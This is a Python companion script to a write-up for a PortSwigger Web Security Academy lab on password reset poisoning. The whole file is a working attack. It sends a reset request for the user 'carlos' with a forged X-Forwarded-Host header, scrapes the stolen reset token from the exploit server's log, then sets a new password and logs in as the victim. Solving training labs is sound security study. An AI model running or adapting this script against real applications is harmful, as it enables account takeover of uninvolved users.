#!/usr/bin/env python3
"""
Password reset poisoning via middleware
PortSwigger Web Security Academy -- Authentication

Companion script for the writeup: 13-password-reset-poisoning-via-middleware.md

What this does:
    Locates this lab instance's exploit server from the homepage, then submits a
    password-reset request for the victim (carlos) with an X-Forwarded-Host
    header pointing at that exploit server. The reset-link hostname is built from
    that header, so the (correctly generated and valid) reset token gets emailed
    inside a link pointing at attacker-controlled infrastructure. The lab
    platform's simulated victim clicks the link exactly as a real user would,
    landing the token in the exploit server's access log -- which this script
    polls for, then uses the recovered token against the real application to set
    a new password for carlos.

Usage:
    python 13-password-reset-poisoning-via-middleware.py <lab-url>

Requirements:
    pip install httpx
"""

import re
import sys
import time
import httpx

VICTIM_USER = "carlos"
NEW_PASSWORD = "pwned123"


def _csrf(html: str) -> str:
    m = re.search(r'name="csrf"\s+value="([^"]+)"', html)
    return m.group(1) if m else ""


def _login(client: httpx.Client, lab_url: str, username: str, password: str) -> httpx.Response:
    page = client.get(f"{lab_url}/login")
    return client.post(f"{lab_url}/login", data={
        "csrf": _csrf(page.text), "username": username, "password": password
    })


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    resp = client.get(lab_url)
    exploit_match = re.search(r"href=['\"]?(https://exploit-[^'\">\s]+)", resp.text)
    if not exploit_match:
        print("[-] Exploit server not found on the homepage.")
        return
    exploit_server = exploit_match.group(1)
    exploit_host = exploit_server.replace("https://", "").replace("http://", "")
    print(f"[+] Exploit server: {exploit_server}")

    page = client.get(f"{lab_url}/forgot-password")
    client.post(f"{lab_url}/forgot-password", data={
        "csrf": _csrf(page.text), "username": VICTIM_USER
    }, headers={"X-Forwarded-Host": exploit_host})
    print(f"[*] Poisoned reset sent for {VICTIM_USER} (X-Forwarded-Host: {exploit_host})")

    print("[*] Waiting for the simulated victim to click the poisoned link...")
    time.sleep(5)

    log_resp = client.get(f"{exploit_server}/log")
    token_match = re.search(r"temp-forgot-password-token=([a-zA-Z0-9]+)", log_resp.text)
    if not token_match:
        print("[*] Not captured yet, waiting longer...")
        time.sleep(10)
        log_resp = client.get(f"{exploit_server}/log")
        token_match = re.search(r"temp-forgot-password-token=([a-zA-Z0-9]+)", log_resp.text)

    if not token_match:
        print("[-] Token not captured from the exploit server log.")
        return

    token = token_match.group(1)
    print(f"[+] Captured token: {token}")

    reset_page = client.get(f"{lab_url}/forgot-password?temp-forgot-password-token={token}")
    client.post(f"{lab_url}/forgot-password?temp-forgot-password-token={token}", data={
        "csrf": _csrf(reset_page.text),
        "temp-forgot-password-token": token,
        "new-password-1": NEW_PASSWORD,
        "new-password-2": NEW_PASSWORD,
    })
    print("[*] Password reset submitted with the stolen token.")

    _login(client, lab_url, VICTIM_USER, NEW_PASSWORD)

    check = client.get(lab_url)
    if "congratulations" in check.text.lower():
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
